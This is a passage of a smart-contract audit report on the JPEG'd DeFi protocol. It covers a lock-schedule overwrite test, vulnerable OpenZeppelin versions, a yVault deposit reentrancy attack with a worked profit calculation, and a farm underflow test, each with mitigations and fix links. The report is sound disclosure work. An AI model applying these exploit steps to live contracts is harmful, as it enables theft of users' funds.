class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk11\">setPendingNFTValueETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">50</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">150000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">locker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">locker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 1. user has JPEG locked for finalization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">finalizePendingNFTValueETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 2. owner submit proposal to further increase NFT value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk11\">setPendingNFTValueETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 3. owner finalizes, has JPEG locked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">finalizePendingNFTValueETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// user schedule has been overwritten</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">schedule</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">locker</span><span class=\"mtk1\">.</span><span class=\"mtk11\">positions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">schedule</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// user tries to unstake</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// wont be able to because schedule was overwritten</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">timeTravel</span><span class=\"mtk1\">(</span><span class=\"mtk11\">days</span><span class=\"mtk1\">(</span><span class=\"mtk7\">366</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">locker</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">index</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;unauthorized&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Release the tokens of the existing schedule. Simple and elegant.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// in JPEGLock#lockFor()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">LockPosition</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">existingPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// release jpegs to existing owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">existingPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ol start=\"2\">\n<li>Revert in <code>finalizePendingNFTValueETH()</code> there is an existing lock schedule. This is less desirable IMO, as there is a use-case for increasing / decreasing the NFT value.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/10\">spaghettieth (JPEG’d) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/10#issuecomment-1099232121\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/3\">jpegd/core#3</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-update-initializer-modifier-to-prevent-reentrancy-during-initialization\" style=\"position:relative;\"><a href=\"#h-03-update-initializer-modifier-to-prevent-reentrancy-during-initialization\" aria-label=\"h 03 update initializer modifier to prevent reentrancy during initialization permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/227\">[H-03] Update initializer modifier to prevent reentrancy during initialization</a></h2>\n<p><em>Submitted by Dravee</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/package.json#L18-L19\">package.json#L18-L19</a><br></p>\n<p>The solution uses:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">&quot;@openzeppelin/contracts&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;^4.0.0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">&quot;@openzeppelin/contracts-upgradeable&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;^4.3.2&quot;</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<p>These dependencies have a known high severity vulnerability:</p>\n<ul>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177\">https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177</a></li>\n<li><a href=\"https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177\">https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177</a></li>\n<li><a href=\"https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176\">https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176</a></li>\n</ul>\n<p>Which makes these contracts vulnerable:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CryptoPunksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">punksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EtherRocksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEGStaking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20Upgradeable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">71</span><span class=\"mtk1\">:     ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">149</span><span class=\"mtk1\">:     ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Upgrade <code>@openzeppelin/contracts</code> and <code>@openzeppelin/contracts-upgradeable</code> to version 4.4.1 or higher.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/227\">spaghettieth (JPEG’d) confirmed, but disagreed with High severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/227#issuecomment-1099246138\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/11\">jpegd/core#11</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-reentrancy-issue-in-yvaultdeposit\" style=\"position:relative;\"><a href=\"#h-04-reentrancy-issue-in-yvaultdeposit\" aria-label=\"h 04 reentrancy issue in yvaultdeposit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/81\">[H-04] Reentrancy issue in <code>yVault.deposit</code></a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145\">yVault.sol#L144-L145</a><br></p>\n<p>In <code>deposit</code>, the balance is cached and then a <code>token.transferFrom</code> is triggered which can lead to exploits if the <code>token</code> is a token that gives control to the sender, like ERC777 tokens.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Initial state: <code>balance() = 1000</code>, shares <code>supply = 1000</code>.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.</p>\n<ul>\n<li>Outer <code>deposit(500)</code>: <code>balanceBefore = 1000</code>. Control is given to attacker …</li>\n<li>Inner <code>deposit(500)</code>: <code>balanceBefore = 1000</code>. <code>shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500</code> shares are minted …</li>\n<li>Outer <code>deposit(500)</code> continues with the mint: <code>shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750</code> are minted.</li>\n<li>Withdrawing the <code>500 + 750 = 1250</code> shares via <code>withdraw(1250)</code>, the attacker receives <code>backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111</code>. The attacker makes a profit of <code>1111 - 1000 = 111</code> tokens.</li>\n<li>They repeat the attack until the vault is drained.</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>safeTransferFrom</code> should be the last call in <code>deposit</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/81\">spaghettieth (JPEG’d) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/81#issuecomment-1099250750\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/19\">jpegd/core#19</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-yvaultlpfarming-no-guarantee-jpeg-currentbalance--previousbalance\" style=\"position:relative;\"><a href=\"#h-05-yvaultlpfarming-no-guarantee-jpeg-currentbalance--previousbalance\" aria-label=\"h 05 yvaultlpfarming no guarantee jpeg currentbalance  previousbalance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/56\">[H-05] <code>yVaultLPFarming</code>: No guarantee JPEG currentBalance > previousBalance</a></h2>\n<p><em>Submitted by hickuphh3</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170\">yVaultLPFarming.sol#L169-L170</a><br></p>\n<p>yVault users participating in the farm have to trust that:</p>\n<ul>\n<li><code>vault.balanceOfJPEG()</code>  returns the correct claimable JPEG amount by its strategy / strategies</li>\n<li>the strategy / strategies will send all claimable JPEG to the farm</li>\n</ul>\n<p>Should either of these assumptions break, then it could possibly be the case that <code>currentBalance</code> is less than <code>previousBalance</code>, causing deposits and crucially, withdrawals to fail due to subtraction overflow.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>For instance,</p>\n<ul>\n<li>Farm migration occurs. A new farm is set in <code>yVault</code>, then <code>withdrawJPEG()</code> is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;will revert old farms&#39; deposits and withdrawals if yVault migrates farm&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 0. setup</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span 